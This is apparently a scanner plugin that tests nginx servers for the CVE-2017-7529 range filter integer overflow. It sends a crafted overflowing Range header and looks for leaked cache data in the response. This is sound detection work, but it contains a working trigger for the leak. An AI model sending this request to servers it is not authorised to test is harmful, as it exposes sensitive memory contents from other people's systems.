############################################################
# Author: yangxu
# Copyright @WebRAY  
############################################################
include("compat.inc");


if (description)
{
  script_id(51799222);
  script_version("1.3");
  script_name(english:"Nginx Remote Integer Overflow Vulnerability(CVE-2017-7529)");
  script_summary(english:"Nginx Remote Integer Overflow Vulnerability(CVE-2017-7529)");
  script_set_attribute(attribute:"description", value:"Nginx versions since 0.5.6 up to and including 1.13.2 are vulnerable to integer overflow vulnerability in nginx range filter module resulting into leak of potentially sensitive information triggered by specially crafted request.");
  script_set_attribute(attribute:"solution", value:"At present, manufacturers have released upgrade patches to fix vulnerabilities.http://mailman.nginx.org/pipermail/nginx-announce/2017/000200.html");
  script_set_attribute(attribute:"vuln_publication_date",value:"2017/07/13");
  script_set_attribute(attribute:"patch_publication_date",value:"2017/07/13");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/07/13");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"risk_factor", value:"Medium");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Web Servers");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_dependencies("nginx_detect.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");
include("install_func.inc");


function check_vuln(port){
	url = string('/');
	req = http_send_recv3(method: "GET", port: port, item: url);
	body_len = strlen(req[2]);
	offset = 605;
	n = body_len + offset;
	header = 775808-n;
    header = "bytes=-"+n+",-9223372036854"+header;

	req_find = http_send_recv3(method: "GET", port: port, item: url,add_headers: make_array("Range",header ));
    if("206">< req_find[0] && "KEY: " >< req_find[2] && "Content-Range: bytes" >< req_find[2]){
		if (report_verbosity > 0) security_hole(port:port, extra:http_last_sent_request()+hexstr(req_find[2]));
			else security_hole(port);
    }
}

function check_vuln_ssl(port){
	url = string('/');
	req = http_send_recv3(method: "GET", port: port, item: url);
	body_len = strlen(req[2]);
	offset = 605;
	n = body_len + offset;
	header = 775808-n;
    header = "bytes=-"+n+",-9223372036854"+header;
	req_find = http_send_recv3(method: "GET", port: port, item: url,add_headers: make_array("Range",header ));
	reqs = http_last_sent_request();
    ssl_reqs = https_req_get(request:reqs, port:port);
	if("206"><ssl_reqs && "KEY: " >< ssl_reqs && "Content-Range: bytes" >< ssl_reqs){
	if (report_verbosity > 0) security_hole(port:port, extra:ssl_reqs);
	    else security_hole(port);
	    }
}


##################################
appname = "nginx";
get_install_count(app_name:appname, exit_if_zero:TRUE);

kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}
